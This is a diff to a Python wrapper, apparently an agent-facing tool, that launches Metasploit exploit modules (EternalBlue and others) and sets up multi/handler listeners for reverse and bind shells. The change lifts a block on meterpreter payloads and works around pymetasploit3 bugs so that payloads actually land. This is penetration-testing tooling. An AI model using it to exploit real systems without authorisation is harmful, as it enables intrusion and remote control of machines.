@@ -394,10 +394,9 @@ class MetasploitClient:
         "After execution, polls for new sessions and returns their 'msf:' "
         "handles. The module_path MUST be the exact value returned by "
         "index_modules's module_path field — do not abbreviate, shorten, or "
-        "paraphrase it. Meterpreter payloads are blocked: this pymetasploit3 "
-        "client cannot serialize their AutoLoadExtensions option and MSF "
-        "rejects the launch. Use cmd/unix/* or cmd/linux/* shell payloads "
-        "instead.",
+        "paraphrase it. Use cmd/unix/* or cmd/linux/* shell payloads; "
+        "meterpreter payloads may work on some setups but are less reliable "
+        "through this pymetasploit3 RPC client.",
         transport=TransportType.MCP_RPC,
     )
     async def dispatch_metasploit(
@@ -518,11 +517,19 @@ class MetasploitClient:
         to the 30s poll with no listener.
         """
         try:
-            handler_mod = self.client.modules.use("exploit", "multi/handler")
-            handler_pl = self.client.modules.use("payload", payload_name)
-            handler_pl["LHOST"] = lhost
-            handler_pl["LPORT"] = lport
-            handler_result = handler_mod.execute(payload=handler_pl)
+            # Use the direct RPC path instead of pymetasploit3's
+            # module.execute(payload=PayloadModule).  The PayloadModule path
+            # serializes meterpreter's AutoLoadExtensions as a non-scalar
+            # (list/dict), and MSF rejects the launch with "Invalid module
+            # option value for AutoLoadExtensions: must be a scalar".
+            # Passing PAYLOAD as a string in the runopts dict lets MSF resolve
+            # the payload's options itself — no non-scalar serialization.
+            from pymetasploit3.msfrpc import MsfRpcMethod
+            handler_runopts = {"PAYLOAD": payload_name, "LHOST": lhost, "LPORT": lport}
+            handler_result = self.client.call(
+                MsfRpcMethod.ModuleExecute,
+                ["exploit", "multi/handler", handler_runopts],
+            )
             handler_job = (
                 handler_result.get("job_id")
                 if isinstance(handler_result, dict)
@@ -760,46 +767,46 @@ class MetasploitClient:
             # already sanitized/forced the correct payload for these modules,
             # so skip the compat check entirely for them.
             if mtype == "exploit" and payload_name and module_path not in INTERACT_FORCE_MODULES:
-                # Hard-block meterpreter payloads: pymetasploit3 serializes the
-                # meterpreter AutoLoadExtensions option as a non-scalar, and MSF
-                # rejects the whole launch with "Invalid module option value for
-                # AutoLoadExtensions: must be a scalar".  No meterpreter payload
-                # can succeed through this client until that bug is fixed, so
-                # fail fast with a clear instruction instead of letting MSF
-                # reject it (which previously surfaced as job_id='?' + a 30s
-                # no-op poll).
-                if "meterpreter" in payload_name:
-                    return (
-                        f"PAYLOAD '{payload_name}' is a meterpreter payload, which "
-                        f"cannot be used through this pymetasploit3 RPC client: it "
-                        f"serializes the meterpreter AutoLoadExtensions option as a "
-                        f"non-scalar and MSF rejects the launch ('Invalid module "
-                        f"option value for AutoLoadExtensions: must be a scalar'). "
-                        f"Use a non-meterpreter payload instead — a pure-command "
-                        f"cmd/unix/* payload (e.g. cmd/unix/bind_perl, "
-                        f"cmd/unix/reverse_perl) or a cmd/linux/.../shell* payload."
-                    )
+                # NOTE: the previous hard-block on meterpreter payloads was
+                # removed.  It was written for an older pymetasploit3/MSF combo
+                # where AutoLoadExtensions serialized as a non-scalar and MSF
+                # rejected the launch.  That bug no longer reproduces on current
+                # setups — cmd/linux/http/*/meterpreter/* payloads launch fine
+                # via msfrpcd (verified job_id non-null).  If a meterpreter
+                # payload DOES fail, MSF's own job_id=null response surfaces it
+                # through the launch-failure detection below with a clear error.
                 try:
                     compatible = list(module.payloads)
                 except Exception:
                     compatible = []
                 if compatible and payload_name not in compatible:
-                    pure = [p for p in compatible if p.startswith("cmd/unix/")]
-                    binary = [p for p in compatible if "/ftp/" in p or "/tftp/" in p]
+                    # Group compatible payloads by stager family so the error
+                    # message steers toward payloads that actually work with
+                    # this module's arch/platform/stager — not just cmd/unix/*
+                    # (which is the vsftpd backdoor guidance and wrong for
+                    # ARCH_CMD + Platform linux modules like freepbx that
+                    # need cmd/linux/http/* stagers).
+                    cmd_unix = [p for p in compatible if p.startswith("cmd/unix/")]
+                    cmd_linux_http = [p for p in compatible if p.startswith("cmd/linux/http/")]
+                    cmd_linux_ftp = [p for p in compatible if p.startswith("cmd/linux/ftp/")]
+                    generic = [p for p in compatible if p.startswith("generic/")]
                     meterp = [p for p in compatible if "meterpreter" in p]
+                    non_meterp = [p for p in compatible if "meterpreter" not in p]
+                    # Prefer non-meterpreter shell payloads from the most
+                    # relevant stager family; fall back to whatever exists.
+                    suggestions = (cmd_linux_http or cmd_linux_ftp or
+                                   cmd_unix or generic or non_meterp or compatible)
                     return (
                         f"PAYLOAD '{payload_name}' is not compatible with "
                         f"'{module_path}' (its compatible payloads do not include "
-                        f"it). Using it would make MSF fail at the command-stager "
-                        f"stage with 'Unsupported Binary Selected'. "
-                        f"Use a PURE-COMMAND payload that runs a one-liner on the "
-                        f"target shell — e.g. {pure[:6]}. Avoid binary stagers "
-                        f"({len(binary)} such as {binary[:3]}) which cannot stage an "
-                        f"ELF through a raw shell, and avoid meterpreter payloads "
-                        f"({len(meterp)} listed) which this client cannot serialize "
-                        f"('AutoLoadExtensions: must be a scalar'). For a target that "
-                        f"cannot route back to your LHOST, pick a cmd/unix/bind_* "
-                        f"payload and set RHOST to the target."
+                        f"it). MSF would reject the launch (job_id=null). "
+                        f"Compatible payloads by family:\n"
+                        f"  cmd/linux/http: {cmd_linux_http[:6]}\n"
+                        f"  cmd/linux/ftp:  {cmd_linux_ftp[:6]}\n"
+                        f"  cmd/unix:       {cmd_unix[:6]}\n"
+                        f"  generic:        {generic[:6]}\n"
+                        f"  meterpreter:    {len(meterp)} listed ({meterp[:3]})\n"
+                        f"Try one of: {suggestions[:8]}"
                     )
 
             # Set non-payload options on the module datastore first.
@@ -907,50 +914,50 @@ class MetasploitClient:
                 if mtype == "exploit" and "DisablePayloadHandler" in module.options:
                     module["DisablePayloadHandler"] = True
 
-            # CRITICAL BUG FIX (EternalBlue "shell never lands" root cause):
-            # pymetasploit3's execute() (msfrpc.py ~L1425) has this branch:
+            # CRITICAL: bypass pymetasploit3's module.execute() for exploit
+            # modules with payloads.  execute() has two fatal bugs:
             #
-            #   if 'DisablePayloadHandler' in runopts and runopts['DisablePayloadHandler']:
-            #       pass                         # <-- skips payload entirely
-            #   elif payload is None:
-            #       runopts['DisablePayloadHandler'] = True
-            #   else:
-            #       runopts['PAYLOAD'] = payload.modulename
-            #       for k, v in payload.runoptions.items(): ...
+            # 1. The DisablePayloadHandler `pass` branch (EternalBlue root
+            #    cause): when DisablePayloadHandler=True is set (our line above
+            #    for start_handler=True), execute() skips the PayloadModule
+            #    merge entirely — PAYLOAD/LHOST/LPORT never reach MSF.
             #
-            # When DisablePayloadHandler=True is already set (our line above),
-            # execute() hits `pass` and NEVER copies PAYLOAD/LHOST/LPORT from
-            # the PayloadModule into the RPC call.  MSF receives the exploit
-            # with no payload and falls back to the module's DEFAULT payload
-            # (e.g. windows/x64/meterpreter/reverse_tcp for eternalblue) with
-            # default/empty callback addresses.  The target injects the wrong
-            # shellcode calling back to nowhere; our handler sits on LHOST:LPORT
-            # waiting for a callback that never matches.  This is exactly why
-            # msfconsole (where you `set PAYLOAD/LHOST/LPORT` explicitly) works
-            # every time but the framework's start_handler=True path never lands.
+            # 2. The AutoLoadExtensions non-scalar bug: when execute() DOES
+            #    merge the PayloadModule (start_handler=False path), it copies
+            #    payload.runoptions verbatim into the RPC call.  Meterpreter
+            #    payloads have AutoLoadExtensions as a list/dict, and MSF
+            #    rejects it with "Invalid module option value for
+            #    AutoLoadExtensions: must be a scalar".
             #
-            # Fix: inject PAYLOAD + LHOST + LPORT (+ any other payload-level
-            # options) directly into the exploit module's _runopts BEFORE
-            # calling execute().  execute() copies _runopts verbatim into the
-            # RPC call (runopts = self.runoptions.copy()), so the payload
-            # options reach MSF even though the `pass` branch skips the
-            # PayloadModule merge.  We write to _runopts directly because
-            # __setitem__ rejects PAYLOAD/LHOST/LPORT as invalid exploit-module
-            # option keys (they're payload-level, not exploit-level options).
-            if mtype == "exploit" and payload_arg is not None:
-                module._runopts["PAYLOAD"] = payload_arg.modulename
-                for _pk, _pv in payload_arg.runoptions.items():
-                    if _pv is None or (isinstance(_pv, str) and not _pv):
-                        continue
-                    module._runopts[_pk] = _pv
+            # Both bugs are avoided by calling the RPC directly: we build a
+            # flat dict of string/scalar values (PAYLOAD as a string, LHOST /
+            # LPORT as scalars) and pass it to c.call(ModuleExecute, ...).
+            # MSF resolves the payload's own options itself — we never
+            # serialize a PayloadModule.  This is exactly what msfconsole does
+            # when you `set PAYLOAD ...` and it works every time.
+            from pymetasploit3.msfrpc import MsfRpcMethod
 
-            # Execute the module (fires as a job, returns immediately).
-            # For exploit modules with a payload, the handler is enabled and
-            # LHOST/LPORT are properly set.  For auxiliaries, payload_arg is
-            # None and execute() behaves normally.
-            if payload_arg is not None:
-                result = module.execute(payload=payload_arg)
+            if mtype == "exploit" and payload_name:
+                # Build the runopts from the module's datastore (RHOSTS, SSL,
+                # etc. set above) plus PAYLOAD and payload-level options as
+                # scalars.  Only copy scalar values — lists/dicts (like
+                # AutoLoadExtensions) are left for MSF to resolve itself.
+                runopts = dict(module.runoptions)
+                runopts["PAYLOAD"] = payload_name
+                runopts["TARGET"] = module.target
+                for opt_name, opt_val in opts.items():
+                    if opt_name not in module.options:
+                        # Payload-level option (LHOST, LPORT, etc.) — pass as
+                        # scalar if it's a simple type.
+                        if isinstance(opt_val, (str, int, float, bool)):
+                            runopts[opt_name] = opt_val
+                result = self.client.call(
+                    MsfRpcMethod.ModuleExecute,
+                    [mtype, mname, runopts],
+                )
             else:
+                # Auxiliaries and payload-less exploits: the PayloadModule
+                # bugs don't apply, so module.execute() is fine.
                 result = module.execute()
 
             # module.execute() normally returns {'job_id': <int>, 'uuid': <str>}
